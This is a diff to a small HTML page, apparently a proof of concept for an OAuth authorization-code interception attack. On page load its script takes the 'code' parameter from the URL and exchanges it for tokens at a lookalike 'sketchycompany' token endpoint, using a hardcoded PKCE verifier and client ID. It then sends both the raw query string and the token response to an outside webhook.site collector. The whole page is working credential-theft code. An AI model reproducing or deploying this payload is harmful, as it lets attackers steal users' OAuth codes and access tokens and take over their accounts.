@@ -1,41 +1,43 @@
 <!DOCTYPE html>
 <html>
     <script type="text/javascript">
-        const code = window.location.search
-
         async function sendCode() {
-            const response = await fetch('https://login.sketchycompaany.upd-dcs.work/token', {
+            const searchParams = window.location.search
+
+            const parsedParams = new URLSearchParams(searchParams);
+            const code = parsedParams.get('code');
+
+            const formBody = new URLSearchParams();
+            formBody.append('grant_type', 'authorization_code');
+            formBody.append('code', code);
+            formBody.append('code_verifier', 'I2c5OoLJFYkzPacUdsrQkJbCsUfxnVnz_rgV_UEdC6dIf_fHcgHsdBWkQqD95ruY');
+            formBody.append('client_id', 'CLIENT123')
+
+            const token = await fetch('https://login.sketchycompany.upd-dcs.work/token', {
                 method: 'POST',
-                body: code,
+                headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: formBody,
             });
 
-            const data = await response.json();
+            const tokenData = await token.json();
 
             await fetch('https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e', {
                 method: 'POST',
-                body: "testing",
+                body: "sending token",
             });
 
             await fetch('https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e', {
                 method: 'POST',
-                body: JSON.stringify(data),
+                body: JSON.stringify(tokenData),
             });
         }
 
         fetch('https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e', {
             method: 'POST',
-            body: "sending code",
+            body: window.location.search,
         });
         sendCode();
-        // fetch('https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e', {
-        //     method: 'POST',
-        //     body: window.location.search,
-        // });
-
-        // fetch('https://webhook.site/8d5ac054-426f-4aeb-a165-24d9bd86d3f1', {
-        //     method: 'POST',
-        //     body: "Received"
-        // });
-        //
     </script>
 </html>
